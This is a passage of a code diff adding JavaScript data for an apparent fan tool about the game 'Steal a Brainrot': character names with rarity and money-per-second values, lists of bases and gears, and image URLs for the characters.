+  { name: "Arca Bros", rarity: "Secret", mps: "$250M/s" },
+  { name: "Moby Bros", rarity: "Secret", mps: "$225M/s" },
+  { name: "Puppetmaster", rarity: "Secret", mps: "$177.5M/s" },
+  { name: "Scarino Crowino", rarity: "Secret", mps: "$135M/s" },
+  { name: "Flying Dutchman", rarity: "Secret", mps: "$92.5M/s" },
+  { name: "Scorpi Inferni", rarity: "Secret", mps: "$85M/s" },
+  { name: "Cobra Gelato", rarity: "Secret", mps: "$77.5M/s" },
+  { name: "Jacko Jakat", rarity: "Secret", mps: "$41M/s" },
+  { name: "Spooky kart", rarity: "Secret", mps: "$13M/s" },
+  { name: "Love Love Bear", rarity: "Secret", mps: "$225M/s" },
+  { name: "Hydra Serpent", rarity: "Secret", mps: "$220M/s" },
+  { name: "La Supreme Combinasion", rarity: "Secret", mps: "$200M/s" },
+  { name: "Kraken", rarity: "Secret", mps: "$200M/s" },
+  { name: "Digi Narwhal", rarity: "Secret", mps: "$200M/s" },
+  { name: "Kalika Bros", rarity: "Secret", mps: "$190M/s" },
+  { name: "Hydra Bunny", rarity: "Secret", mps: "$185M/s" },
+  { name: "Cola Cat", rarity: "Secret", mps: "$185M/s" },
+  { name: "Cerberus", rarity: "Secret", mps: "$175M/s" },
+  { name: "Venuspino", rarity: "Secret", mps: "$175M/s" },
+  { name: "Jelly Moby", rarity: "Secret", mps: "$175M/s" },
+  { name: "Celestial Pegasus", rarity: "Secret", mps: "$175M/s" },
+  { name: "Bumbatron", rarity: "Secret", mps: "$172.5M/s" },
+  { name: "Bunny and Eggy", rarity: "Secret", mps: "$170M/s" },
+  { name: "La Breakfast Combinasion", rarity: "Secret", mps: "$165M/s" },
+  { name: "Rosey and Teddy", rarity: "Secret", mps: "$165M/s" },
+  { name: "Medusini and Demonini", rarity: "Secret", mps: "$180M/s" },
+  { name: "Skelly and Coffy", rarity: "Secret", mps: "$155M/s" },
+  { name: "Spooketti Tualetti", rarity: "Secret", mps: "$77.5M/s" },
+  { name: "Spooky Spooky Sahur", rarity: "Secret", mps: "$46M/s" },
+  { name: "Boo Boo Rocket", rarity: "Secret", mps: "$37.5M/s" },
+  { name: "Pum Pum Pum", rarity: "Secret", mps: "$31M/s" },
+  { name: "Fang Fang Draculang", rarity: "Secret", mps: "$24.5M/s" },
+  { name: "Scary Bros", rarity: "Secret", mps: "$230M/s" },
+  { name: "Cabin Bros", rarity: "Secret", mps: "$205M/s" },
+  { name: "Nacho Bros", rarity: "Secret", mps: "$82.5M/s" },
+  { name: "Spinny Bros", rarity: "Secret", mps: "$61.5M/s" },
+  { name: "Machine Bros", rarity: "Secret", mps: "$145M/s" },
+  { name: "Scorpi Bros", rarity: "Secret", mps: "$110M/s" },
+  { name: "Noobini Bros", rarity: "Secret", mps: "$11M/s" },
+  { name: "Tang Bros", rarity: "Secret", mps: "$64M/s" },
+  { name: "Capitano Moby", rarity: "Secret", mps: "$160M/s" },
+  { name: "Orchidox", rarity: "Secret", mps: "$155M/s" },
+  { name: "Cooki and Milki", rarity: "Secret", mps: "$155M/s" },
+  { name: "Arcadragon", rarity: "Secret", mps: "$150M/s" },
+  { name: "Burguro and Fryuro", rarity: "Secret", mps: "$150M/s" },
+  { name: "Los Secret Combinasionas", rarity: "Secret", mps: "$150M/s" },
+  { name: "Ketupat Bros", rarity: "Secret", mps: "$145M/s" },
+  { name: "Reinito Sleighito", rarity: "Secret", mps: "$140M/s" },
+  { name: "Fortunu and Cashuru", rarity: "Secret", mps: "$130M/s" },
+  { name: "Pizza and Ranch", rarity: "Secret", mps: "$130M/s" },
+  { name: "Los Amigos", rarity: "Secret", mps: "$130M/s" },
+  { name: "Pancake and Syrup", rarity: "Secret", mps: "$125M/s" },
+  { name: "Foxini Lanternini", rarity: "Secret", mps: "$115M/s" },
+  { name: "Popcuru and Fizzuru", rarity: "Secret", mps: "$115M/s" },
+  { name: "Los Sekolahs", rarity: "Secret", mps: "$110M/s" },
+  { name: "Sammyni Truckini", rarity: "Secret", mps: "$110M/s" },
+  { name: "Signore Carapace", rarity: "Secret", mps: "$105M/s" },
+  { name: "La Casa Boo", rarity: "Secret", mps: "$100M/s" },
+  { name: "Cash or Card", rarity: "Secret", mps: "$100M/s" },
+  { name: "Fragrama and Chocrama", rarity: "Secret", mps: "$100M/s" },
+  { name: "Sammyni Spookyni", rarity: "Secret", mps: "$97.5M/s" },
+  { name: "Los Admins", rarity: "Secret", mps: "$95M/s" },
+  { name: "La Secret Combinasion", rarity: "Secret", mps: "$95M/s" },
+  { name: "La Fuse Machine", rarity: "Secret", mps: "$95M/s" },
+  { name: "Duggy Bros", rarity: "Secret", mps: "$90M/s" },
+  { name: "La Food Combinasion", rarity: "Secret", mps: "$90M/s" },
+  { name: "Yetimatic", rarity: "Secret", mps: "$87.5M/s" },
+  { name: "Gold and Diamond", rarity: "Secret", mps: "$85M/s" },
+  { name: "Elefanto Frigo", rarity: "Secret", mps: "$85M/s" },
+  { name: "Sammyni Cakini", rarity: "Secret", mps: "$85M/s" },
+  { name: "S'more Serat", rarity: "Secret", mps: "$85M/s" },
+  { name: "Tirilikalika Tirilikalako", rarity: "Secret", mps: "$82.5M/s" },
+  { name: "Boppin Bunny", rarity: "Secret", mps: "$80M/s" },
+  { name: "Spooky and Pumpky", rarity: "Secret", mps: "$80M/s" },
+  { name: "Cangurato Gelato", rarity: "Secret", mps: "$77.5M/s" },
+  { name: "La Craft Machine", rarity: "Secret", mps: "$75M/s" },
+  { name: "Los Hackers", rarity: "Secret", mps: "$75M/s" },
+  { name: "Ginger Gerat", rarity: "Secret", mps: "$75M/s" },
+  { name: "La Ginger Sekolah", rarity: "Secret", mps: "$75M/s" },
+  { name: "Capitano Americano", rarity: "Secret", mps: "$72.5M/s" },
+  { name: "Bearito Cabinito", rarity: "Secret", mps: "$72.5M/s" },
+  { name: "Rubiko and Kubiko", rarity: "Secret", mps: "$72.5M/s" },
+  { name: "Rubrikiko", rarity: "Secret", mps: "$70M/s" },
+  { name: "Examen Bros", rarity: "Secret", mps: "$70M/s" },
+  { name: "Los Spaghettis", rarity: "Secret", mps: "$70M/s" },
+  { name: "Sammyni Fattini", rarity: "Secret", mps: "$70M/s" },
+  { name: "Gorillo Subwoofero", rarity: "Secret", mps: "$68M/s" },
+  { name: "Festive 67", rarity: "Secret", mps: "$67M/s" },
+  { name: "Panda Popanda", rarity: "Secret", mps: "$67M/s" },
+  { name: "Queen Bee", rarity: "Secret", mps: "$65M/s" },
+  { name: "Quackini Snackini", rarity: "Secret", mps: "$65M/s" },
+  { name: "Ventoliero Pavonero", rarity: "Secret", mps: "$65M/s" },
+  { name: "Grabatron", rarity: "Secret", mps: "$62.5M/s" },
+  { name: "Pop Pop Petalini", rarity: "Secret", mps: "$62.5M/s" },
+  { name: "Los Tictacs", rarity: "Secret", mps: "$60M/s" },
+  { name: "Cloverat Clapat", rarity: "Secret", mps: "$60M/s" },
+  { name: "Spaghetti Tualetti", rarity: "Secret", mps: "$60M/s" },
+  { name: "Candini Fluffini", rarity: "Secret", mps: "$57.5M/s" },
+  { name: "Antonio", rarity: "Secret", mps: "$55M/s" },
+  { name: "Steakini Fattini", rarity: "Secret", mps: "$55M/s" },
+  { name: "Caylusaurus", rarity: "Secret", mps: "$55M/s" },
+  { name: "Hopilikalika Hopilikalako", rarity: "Secret", mps: "$55M/s" },
+  { name: "La Easter Grande", rarity: "Secret", mps: "$55M/s" },
+  { name: "Polaroidini", rarity: "Secret", mps: "$55M/s" },
+  { name: "Garama and Madundung", rarity: "Secret", mps: "$50M/s" },
+  { name: "Nacho Spyder", rarity: "Secret", mps: "$50M/s" },
+  { name: "Rosetti Tualetti", rarity: "Secret", mps: "$50M/s" },
+  { name: "Scorpino Coasterino", rarity: "Secret", mps: "$47.5M/s" },
+  { name: "Nachorilla", rarity: "Secret", mps: "$47.5M/s" },
+  { name: "Chicli Chicla", rarity: "Secret", mps: "$47.5M/s" },
+  { name: "Fishino Clownino", rarity: "Secret", mps: "$47M/s" },
+  { name: "Money Money Bros", rarity: "Secret", mps: "$47M/s" },
+  { name: "Gold Gold Gold", rarity: "Secret", mps: "$45M/s" },
+  { name: "Jolly Jolly Sahur", rarity: "Secret", mps: "$45M/s" },
+  { name: "Lavadorito Spinito", rarity: "Secret", mps: "$45M/s" },
+  { name: "Rico Dinero", rarity: "Secret", mps: "$42.5M/s" },
+  { name: "Los Tangcitos", rarity: "Secret", mps: "$42.5M/s" },
+  { name: "Ketchuru and Musturu", rarity: "Secret", mps: "$42.5M/s" },
+  { name: "La Lucky Grande", rarity: "Secret", mps: "$40M/s" },
+  { name: "La Romantic Grande", rarity: "Secret", mps: "$40M/s" },
+  { name: "Orcaledon", rarity: "Secret", mps: "$40M/s" },
+  { name: "Swaggy Bros", rarity: "Secret", mps: "$40M/s" },
+  { name: "Tictac Sahur", rarity: "Secret", mps: "$37.5M/s" },
+  { name: "Dug Dug Dug", rarity: "Secret", mps: "$35M/s" },
+  { name: "Ketupat Kepat", rarity: "Secret", mps: "$35M/s" },
+  { name: "La Taco Combinasion", rarity: "Secret", mps: "$35M/s" },
+  { name: "Coco and Mango", rarity: "Secret", mps: "$33.5M/s" },
+  { name: "Tang Tang Keletang", rarity: "Secret", mps: "$33.5M/s" },
+  { name: "Lovin Rose", rarity: "Secret", mps: "$32.5M/s" },
+  { name: "Noo My Examine", rarity: "Secret", mps: "$32.5M/s" },
+  { name: "Bufalino Boomberino", rarity: "Secret", mps: "$32M/s" },
+  { name: "Honey Honey Bear", rarity: "Secret", mps: "$32M/s" },
+  { name: "Los Tacoritas", rarity: "Secret", mps: "$32M/s" },
+  { name: "Eviledon", rarity: "Secret", mps: "$31.5M/s" },
+  { name: "Los Primos", rarity: "Secret", mps: "$31M/s" },
+  { name: "Esok Sekolah", rarity: "Secret", mps: "$30M/s" },
+  { name: "La Jolly Grande", rarity: "Secret", mps: "$30M/s" },
+  { name: "Los Cupids", rarity: "Secret", mps: "$30M/s" },
+  { name: "Los Puggies", rarity: "Secret", mps: "$30M/s" },
+  { name: "W or L", rarity: "Secret", mps: "$30M/s" },
+  { name: "Globa Steppa", rarity: "Secret", mps: "$27.5M/s" },
+  { name: "Gobblino Uniciclino", rarity: "Secret", mps: "$27.5M/s" },
+  { name: "Tralaledon", rarity: "Secret", mps: "$27.5M/s" },
+  { name: "Noodle Noodle Poodle", rarity: "Secret", mps: "$27.5M/s" },
+  { name: "Mieteteira Bicicleteira", rarity: "Secret", mps: "$26M/s" },
+  { name: "Tuff Toucan", rarity: "Secret", mps: "$26M/s" },
+  { name: "Tacoturbo Tacorito", rarity: "Secret", mps: "$26M/s" },
+  { name: "Chillin Chili", rarity: "Secret", mps: "$25M/s" },
+  { name: "Chipso and Queso", rarity: "Secret", mps: "$25M/s" },
+  { name: "Money Money Reindeer", rarity: "Secret", mps: "$25M/s" },
+  { name: "La Spooky Grande", rarity: "Secret", mps: "$24.5M/s" },
+  { name: "La Extinct Grande", rarity: "Secret", mps: "$23.5M/s" },
+  { name: "Los Candies", rarity: "Secret", mps: "$23M/s" },
+  { name: "Celularcini Viciosini", rarity: "Secret", mps: "$22.5M/s" },
+  { name: "Churrito Bunnito", rarity: "Secret", mps: "$21M/s" },
+  { name: "Money Money Puggy", rarity: "Secret", mps: "$21M/s" },
+  { name: "Cigno Fulgoro", rarity: "Secret", mps: "$20M/s" },
+  { name: "Los Hotspotsitos", rarity: "Secret", mps: "$20M/s" },
+  { name: "Los Jolly Combinasionas", rarity: "Secret", mps: "$20M/s" },
+  { name: "Los Spooky Combinasionas", rarity: "Secret", mps: "$20M/s" },
+  { name: "Chicleteira Champeona", rarity: "Secret", mps: "$19M/s" },
+  { name: "Los Planitos", rarity: "Secret", mps: "$18.5M/s" },
+  { name: "Snailo Clovero", rarity: "Secret", mps: "$18.5M/s" },
+  { name: "Deputy Leopard", rarity: "Secret", mps: "$18M/s" },
+  { name: "Chicleteira Cupideira", rarity: "Secret", mps: "$17.5M/s" },
+  { name: "DJ Panda", rarity: "Secret", mps: "$17.5M/s" },
+  { name: "Las Sis", rarity: "Secret", mps: "$17.5M/s" },
+  { name: "Spinny Hammy", rarity: "Secret", mps: "$17M/s" },
+  { name: "Los Sweethearts", rarity: "Secret", mps: "$16.5M/s" },
+  { name: "Tacorita Bicicleta", rarity: "Secret", mps: "$16.5M/s" },
+  { name: "Bacuru and Egguru", rarity: "Secret", mps: "$16M/s" },
+  { name: "Baskito", rarity: "Secret", mps: "$16M/s" },
+  { name: "Bananito", rarity: "Secret", mps: "$15M/s" },
+  { name: "Chicleteira Noelteira", rarity: "Secret", mps: "$15M/s" },
+  { name: "Los Combinasionas", rarity: "Secret", mps: "$15M/s" },
+  { name: "Nuclearo Dinossauro", rarity: "Secret", mps: "$15M/s" },
+  { name: "Chimnino", rarity: "Secret", mps: "$14M/s" },
+  { name: "Los 67", rarity: "Secret", mps: "$13.5M/s" },
+  { name: "Noo My Gold", rarity: "Secret", mps: "$13.5M/s" },
+  { name: "Noo My Heart", rarity: "Secret", mps: "$13M/s" },
+  { name: "Swag Soda", rarity: "Secret", mps: "$13M/s" },
+  { name: "Pogo Pogo Penguin", rarity: "Secret", mps: "$12.5M/s" },
+  { name: "Mariachi Corazoni", rarity: "Secret", mps: "$12.5M/s" },
+  { name: "Tacorillo Crocodillo", rarity: "Secret", mps: "$12.5M/s" },
+  { name: "La Grande Combinasion", rarity: "Secret", mps: "$10M/s" },
+  { name: "Los 25", rarity: "Secret", mps: "$10M/s" },
+  { name: "Conetto Morsetto", rarity: "Secret", mps: "$10M/s" },
+  { name: "Los Burritos", rarity: "Secret", mps: "$8.5M/s" },
+  { name: "Los Mobilis", rarity: "Secret", mps: "$8.5M/s" },
+  { name: "John Doe", rarity: "Secret", mps: "$7.5M/s" },
+  { name: "67", rarity: "Secret", mps: "$7.5M/s" },
+  { name: "Donkeyturbo Express", rarity: "Secret", mps: "$7.5M/s" },
+  { name: "Los Chicleteiras", rarity: "Secret", mps: "$7M/s" },
+  { name: "Noo My Eggs", rarity: "Secret", mps: "$7M/s" },
+  { name: "Burrito Bat", rarity: "Secret", mps: "$7M/s" },
+  { name: "Guest 666", rarity: "Secret", mps: "$6.6M/s" },
+  { name: "Los Mi Gatitos", rarity: "Secret", mps: "$6.5M/s" },
+  { name: "Strawberrita", rarity: "Secret", mps: "$6.5M/s" },
+  { name: "Noo My Present", rarity: "Secret", mps: "$6M/s" },
+  { name: "Rang Ring Bus", rarity: "Secret", mps: "$6M/s" },
+  { name: "Los Nooo My Hotspotsitos", rarity: "Secret", mps: "$5.5M/s" },
+  { name: "Serafinna Medusella", rarity: "Secret", mps: "$5.5M/s" },
+  { name: "Arcadopus", rarity: "Secret", mps: "$5M/s" },
+  { name: "Noo My Candy", rarity: "Secret", mps: "$5M/s" },
+  { name: "Los Quesadillas", rarity: "Secret", mps: "$4.5M/s" },
+  { name: "Los Bunitos", rarity: "Secret", mps: "$4.25M/s" },
+  { name: "Burrito Bandito", rarity: "Secret", mps: "$4M/s" },
+  { name: "Chicleteirina Bicicleteirina", rarity: "Secret", mps: "$4M/s" },
+  { name: "Chill Puppy", rarity: "Secret", mps: "$4M/s" },
+  { name: "Granny", rarity: "Secret", mps: "$4M/s" },
+  { name: "4th Bros", rarity: "Secret", mps: "$3.75M/s" },
+  { name: "Luck Luck Luck Sahur", rarity: "Secret", mps: "$3.7M/s" },
+  { name: "Brunito Marsito", rarity: "Secret", mps: "$3.5M/s" },
+  { name: "Chicleteira Bicicleteira", rarity: "Secret", mps: "$3.5M/s" },
+  { name: "Cupid Hotspot", rarity: "Secret", mps: "$3.5M/s" },
+  { name: "Eid Eid Eid Sahur", rarity: "Secret", mps: "$3.5M/s" },
+  { name: "Quesadillo Vampiro", rarity: "Secret", mps: "$3.5M/s" },
+  { name: "Mi Gatito", rarity: "Secret", mps: "$3.25M/s" },
+  { name: "Ho Ho Ho Sahur", rarity: "Secret", mps: "$3.2M/s" },
+  { name: "Cupid Cupid Sahur", rarity: "Secret", mps: "$3.1M/s" },
+  { name: "Bunito Bunito Spinito", rarity: "Secret", mps: "$3M/s" },
+  { name: "Naughty Naughty", rarity: "Secret", mps: "$3M/s" },
+  { name: "Pot Pumpkin", rarity: "Secret", mps: "$3M/s" },
+  { name: "Quesadilla Crocodila", rarity: "Secret", mps: "$3M/s" },
+  { name: "Horegini Boom", rarity: "Secret", mps: "$2.75M/s" },
+  { name: "Santa Hotspot", rarity: "Secret", mps: "$2.6M/s" },
+  { name: "25", rarity: "Secret", mps: "$2.5M/s" },
+  { name: "Pirulitoita Bicicleteira", rarity: "Secret", mps: "$2.5M/s" },
+  { name: "Pot Hotspot", rarity: "Secret", mps: "$2.5M/s" },
+  { name: "Bunny Bunny Bunny Sahur", rarity: "Secret", mps: "$2.25M/s" },
+  { name: "To To To Sahur", rarity: "Secret", mps: "$2.25M/s" },
+  { name: "La Sahur Combinasion", rarity: "Secret", mps: "$2M/s" },
+  { name: "List List List Sahur", rarity: "Secret", mps: "$2M/s" },
+  { name: "Telemorte", rarity: "Secret", mps: "$2M/s" },
+  { name: "Berryno", rarity: "Secret", mps: "$1.5M/s" },
+  { name: "Bunnyman", rarity: "Secret", mps: "$1.5M/s" },
+  { name: "Los Jobcitos", rarity: "Secret", mps: "$1.5M/s" },
+  { name: "Nooo My Hotspot", rarity: "Secret", mps: "$1.5M/s" },
+  { name: "Tung Tung Tung Sahur", rarity: "Secret", mps: "$1.5M/s" },
+  { name: "Cuadramat and Pakrahmatmamat", rarity: "Secret", mps: "$1.4M/s" },
+  { name: "Please My Present", rarity: "Secret", mps: "$1.3M/s" },
+  { name: "Easter Easter Easter Sahur", rarity: "Secret", mps: "$1.25M/s" },
+  { name: "Los Cucarachas", rarity: "Secret", mps: "$1.2M/s" },
+  { name: "1x1x1x1", rarity: "Secret", mps: "$1.1M/s" },
+  { name: "La Vacca Lepre Lepreino", rarity: "Secret", mps: "$1.1M/s" },
+  { name: "Graipuss Medussi", rarity: "Secret", mps: "$1M/s" },
+  { name: "Love Love Love Sahur", rarity: "Secret", mps: "$1M/s" },
+  { name: "Perrito Burrito", rarity: "Secret", mps: "$1M/s" },
+  { name: "Giftini Spyderini", rarity: "Secret", mps: "$999.9K/s" },
+  { name: "GOAT", rarity: "Secret", mps: "$950K/s" },
+  { name: "Paradiso Axolottino", rarity: "Secret", mps: "$900K/s" },
+  { name: "Trickolino", rarity: "Secret", mps: "$900K/s" },
+  { name: "Triplito Tralaleritos", rarity: "Secret", mps: "$875K/s" },
+  { name: "Buntteo", rarity: "Secret", mps: "$850K/s" },
+  { name: "La Vacca Jacko Linterino", rarity: "Secret", mps: "$850K/s" },
+  { name: "Fishboard", rarity: "Secret", mps: "$825K/s" },
+  { name: "Santteo", rarity: "Secret", mps: "$800K/s" },
+  { name: "Las Vaquitas Saturnitas", rarity: "Secret", mps: "$750K/s" },
+  { name: "Los Karkeritos", rarity: "Secret", mps: "$750K/s" },
+  { name: "Karker Sahur", rarity: "Secret", mps: "$725K/s" },
+  { name: "Frankentteo", rarity: "Secret", mps: "$700K/s" },
+  { name: "Job Job Job Sahur", rarity: "Secret", mps: "$700K/s" },
+  { name: "Los Trios", rarity: "Secret", mps: "$700K/s" },
+  { name: "Las Tralaleritas", rarity: "Secret", mps: "$650K/s" },
+  { name: "Pumpkini Spyderini", rarity: "Secret", mps: "$650K/s" },
+  { name: "Rocco Disco", rarity: "Secret", mps: "$650K/s" },
+  { name: "Extinct Matteo", rarity: "Secret", mps: "$625K/s" },
+  { name: "La Karkerkar Combinasion", rarity: "Secret", mps: "$600K/s" },
+  { name: "La Vacca Prese Presente", rarity: "Secret", mps: "$600K/s" },
+  { name: "Reindeer Tralala", rarity: "Secret", mps: "$600K/s" },
+  { name: "Yess My Examine", rarity: "Secret", mps: "$575K/s" },
+  { name: "Guerriro Digitale", rarity: "Secret", mps: "$550K/s" },
+  { name: "Boatito Auratito", rarity: "Secret", mps: "$525K/s" },
+  { name: "Los Tortus", rarity: "Secret", mps: "$500K/s" },
+  { name: "Los Tralaleritos", rarity: "Secret", mps: "$500K/s" },
+  { name: "Vulturino Skeletono", rarity: "Secret", mps: "$500K/s" },
+  { name: "Zombie Tralala", rarity: "Secret", mps: "$500K/s" },
+  { name: "La Cucaracha", rarity: "Secret", mps: "$475K/s" },
+  { name: "Extinct Tralalero", rarity: "Secret", mps: "$450K/s" },
+  { name: "Fragola La La La", rarity: "Secret", mps: "$450K/s" },
+  { name: "Agarrini la Palini", rarity: "Secret", mps: "$425K/s" },
+  { name: "Los Spyderinis", rarity: "Secret", mps: "$425K/s" },
+  { name: "Blackhole GOAT", rarity: "Secret", mps: "$400K/s" },
+  { name: "Chachechi", rarity: "Secret", mps: "$400K/s" },
+  { name: "Dul Dul Dul", rarity: "Secret", mps: "$375K/s" },
+  { name: "Torrtuginni Dragonfrutini", rarity: "Secret", mps: "$350K/s" },
+  { name: "Trenostruzzo Turbo 4000", rarity: "Secret", mps: "$335K/s" },
+  { name: "Bisonte Giuppitere", rarity: "Secret", mps: "$325K/s" },
+  { name: "Karkerkar Kurkur", rarity: "Secret", mps: "$325K/s" },
+  { name: "La Vacca Saturno Saturnita", rarity: "Secret", mps: "$325K/s" },
+  { name: "Los Matteos", rarity: "Secret", mps: "$325K/s" },
+  { name: "Sammyni Spyderini", rarity: "Secret", mps: "$325K/s" },
+  { name: "Jackorilla", rarity: "Secret", mps: "$315K/s" },
+  { name: "Ginger Cisterna", rarity: "Secret", mps: "$293.5K/s" },
+  { name: "Centrucci Nuclucci", rarity: "Secret", mps: "$15.5K/s" },
+  { name: "Rhino Helicopterino", rarity: "Secret", mps: "$11K/s" },
+  { name: "Secret Lucky Block", rarity: "Secret", mps: "$0/s" },
+  { name: "Tralalero Tralala", rarity: "Secret", mps: "$10M/s" },
+  { name: "Bombardiro Crocodilo", rarity: "Secret", mps: "$9M/s" },
+  { name: "Bonito Bonito Crocodilo", rarity: "Secret", mps: "$10M/s" },
+  { name: "Lirili Larila", rarity: "Secret", mps: "$9M/s" }
+];
+
+const ALL_BASES=["Aquatic","Bee Emperor","Bunny Basket","Candy","Christmas","Cursed","Cyber","Diamond","Divine","Easter","Galaxy","Gingerbread","Gold","Halloween","Honey Bee Base","Lava","Lucky","Octo","Pot of Gold","Radioactive","Rainbow","Rose","Summer","Taco","Valentines","Yin Yang","Tralala","Tralalero","Reaper"];
+const ALL_GEARS=["Alien Slap","Flying Bee","Crystal Hammer","Blackhole Bomb","Bloodmoon Hammer","Bloodmoon Slap","Candy Sentry","Candy Slap","Cupid's Wings","Cursed Slap","Cyber Slap","Demon's Head","Divine Slap","Lava Blaster","Lava Slap","Radioactive Airstrike","Radioactive Slap","Rainbow Hammer","Rainbow Slap","Santa's Sleigh","Waverider","Witch's Broom","Yin Yang Lamp","Yin Yang Slap","Phantom Slap","Crystal Slap","Skeleton Dragon"];
+
+const BRAINROT_IMAGES = {
+  "Strawberry Elephant": "https://static.wikia.nocookie.net/stealabr/images/7/7b/Strawberry_Elephant.png/revision/latest?cb=20261010220206",
+  "Meowl": "https://static.wikia.nocookie.net/stealabr/images/6/62/Meowl.png/revision/latest?cb=20251022133154",
+  "Headless Horseman": "https://static.wikia.nocookie.net/stealabr/images/2/2a/Horseman.webp/revision/latest/scale-to-width-down/268?cb=20260704043035",
+  "John Pork": "https://static.wikia.nocookie.net/stealabr/images/d/d2/John_Pork.png/revision/latest?cb=20260502233229",
+  "Skibidi Toilet": "https://static.wikia.nocookie.net/stealabr/images/a/a7/Default_Skibidi_Toilet.png/revision/latest?cb=20260528092806",
+  "Phoenix": "https://static.wikia.nocookie.net/stealabr/images/c/c1/Phoenix.png/revision/latest?cb=20261004215622",
+  "Los Dragons": "https://static.wikia.nocookie.net/stealabr/images/4/43/Los_Dragons.png/revision/latest?cb=20261019020512",
+  "Griffin": "https://static.wikia.nocookie.net/stealabr/images/f/f8/Griffin.png/revision/latest/scale-to-width-down/268?cb=20260417151951",
+  "Dragon Aquanini": "https://static.wikia.nocookie.net/stealabr/images/0/0c/Dragon_aquanini_but_high_graphism.png/revision/latest?cb=20260610135509",
+  "Dragon Gingerini": "https://static.wikia.nocookie.net/stealabr/images/a/a6/Dragon_Gingerini.png/revision/latest?cb=20260528114017",
+  "Dragon Skeletonini": "https://static.wikia.nocookie.net/stealabr/images/5/51/Dragon_Skeletonini.png/revision/latest?cb=20261010204212",
+  "Plant Bros": "https://static.wikia.nocookie.net/stealabr/images/9/9f/Plant_Bros.png/revision/latest?cb=20261004154647",
+  "Hydra Dragon Cannelloni": "https://static.wikia.nocookie.net/stealabr/images/e/ee/Hydra_Dragon_Cannelloni.png/revision/latest?cb=20260207220000",
+  "Dragon Cannelloni": "https://static.wikia.nocookie.net/stealabr/images/a/a5/Dragon_Cannelloni.png/revision/latest?cb=20260428162417",
+  "Arca Bros": "https://static.wikia.nocookie.net/stealabr/images/8/8e/Arca_Bros.png/revision/latest?cb=20261017213220",
+  "Cobra Gelato": "https://static.wikia.nocookie.net/stealabr/images/2/24/Cobra_Gelato.png/revision/latest?cb=20261017194539",
+  "Spooky kart": "https://cdn.nookazon.com/stealabrainrot/items/4ed683f643fe4da6.png",
+  "Jacko Jakat": "https://static.wikia.nocookie.net/stealabr/images/8/8f/Jacko_Jakat.png/revision/latest?cb=20261031221111",
+  "Scorpi Inferni": "https://static.wikia.nocookie.net/stealabr/images/4/4b/Scorpi_Inferni.png/revision/latest?cb=20261103143623",
+  "Scarino Crowino": "https://static.wikia.nocookie.net/stealabr/images/8/85/Scarino_Crowino.png/revision/latest?cb=20261031201353",
+  "Puppetmaster": "https://static.wikia.nocookie.net/stealabr/images/a/aa/Puppetmaster.png/revision/latest?cb=20261101185932",
+  "Flying Dutchman": "https://static.wikia.nocookie.net/stealabr/images/b/ba/Flying_Dutchman.png/revision/latest?cb=20261010201300",
+  "Moby Bros": "https://static.wikia.nocookie.net/stealabr/images/5/5b/Moby_Bros.png/revision/latest?cb=20260711200502",
+  "Love Love Bear": "https://static.wikia.nocookie.net/stealabr/images/b/bf/Love_Love_Bear.png/revision/latest?cb=20260417150552",
+  "Hydra Serpent": "https://static.wikia.nocookie.net/stealabr/images/8/8c/Hydra_Serpent.png/revision/latest?cb=20260919212453",
+  "La Supreme Combinasion": "https://static.wikia.nocookie.net/stealabr/images/c/c8/La_Supreme_Combinasion.png/revision/latest?cb=20261003012919",
+  "Kraken": "https://static.wikia.nocookie.net/stealabr/images/d/d3/Kraken.png/revision/latest?cb=20260616235047",
+  "Digi Narwhal": "https://static.wikia.nocookie.net/stealabr/images/7/7f/Digi_Narwhal.png/revision/latest?cb=20260419152454",
+  "Kalika Bros": "https://static.wikia.nocookie.net/stealabr/images/f/f3/Kalika_Bros.png/revision/latest?cb=20260419152541",
+  "Hydra Bunny": "https://static.wikia.nocookie.net/stealabr/images/0/0b/Hydra_Bunny.png/revision/latest/scale-to-width-down/268?cb=20260626000309",
+  "Cerberus": "https://static.wikia.nocookie.net/stealabr/images/4/45/Cerberus.png/revision/latest?cb=20260217181804",
+  "Venuspino": "https://static.wikia.nocookie.net/stealabr/images/0/0c/Venuspino.png/revision/latest?cb=20260616235620",
+  "Jelly Moby": "https://static.wikia.nocookie.net/stealabr/images/a/ad/Jelly_Moby.png/revision/latest?cb=20260626000342",
+  "Celestial Pegasus": "https://static.wikia.nocookie.net/stealabr/images/c/ce/Celestial_Pegasus.png/revision/latest?cb=20260301002910",
+  "Bumbatron": "https://static.wikia.nocookie.net/stealabr/images/0/03/Bumbatron.png/revision/latest?cb=20260809133038",
+  "Bunny and Eggy": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Bunny_and_Eggy.png",
+  "La Breakfast Combinasion": "https://cdn.nookazon.com/128x128/stealabrainrot/items/2a9155c7c153d651.png",
+  "Rosey and Teddy": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Rosey_and_Teddy.png",
+  "Medusini and Demonini": "https://static.wikia.nocookie.net/stealabr/images/4/41/Medusini_and_Demonini.png/revision/latest?cb=20261021185855",
+  "Skelly and Coffy": "https://static.wikia.nocookie.net/stealabr/images/7/7b/Skelly_and_Coffy.png/revision/latest?cb=20261018014756",
+  "Spooketti Tualetti": "https://cdn.nookazon.com/128x128/stealabrainrot/items/d47312aeb8461cd6.png",
+  "Spooky Spooky Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/aa829c4e1b8c802f.png",
+  "Boo Boo Rocket": "https://cdn.nookazon.com/128x128/stealabrainrot/items/3d54123541c9dba7.png",
+  "Pum Pum Pum": "https://cdn.nookazon.com/128x128/stealabrainrot/items/d05557e9b2b40a48.png",
+  "Fang Fang Draculang": "https://cdn.nookazon.com/128x128/stealabrainrot/items/e18afb025b7c3cf2.png",
+  "Scary Bros": "https://static.wikia.nocookie.net/stealabr/images/7/7f/Scary_Bros.png/revision/latest?cb=20261115002521",
+  "Cabin Bros": "https://static.wikia.nocookie.net/stealabr/images/5/54/Cabin_Bros.png/revision/latest?cb=20261114211801",
+  "Nacho Bros": "https://static.wikia.nocookie.net/stealabr/images/9/98/Nacho_Bros.png/revision/latest?cb=20261114232206",
+  "Spinny Bros": "https://static.wikia.nocookie.net/stealabr/images/8/8e/Spinny_Bros.png/revision/latest?cb=20261114212002",
+  "Machine Bros": "https://static.wikia.nocookie.net/stealabr/images/2/26/Machine_Bros.png/revision/latest?cb=20261114211651",
+  "Scorpi Bros": "https://static.wikia.nocookie.net/stealabr/images/e/ed/Scorpi_Bros.png/revision/latest?cb=20261114211437",
+  "Noobini Bros": "https://static.wikia.nocookie.net/stealabr/images/b/b0/Noobini_Bros.png/revision/latest?cb=20261114212124",
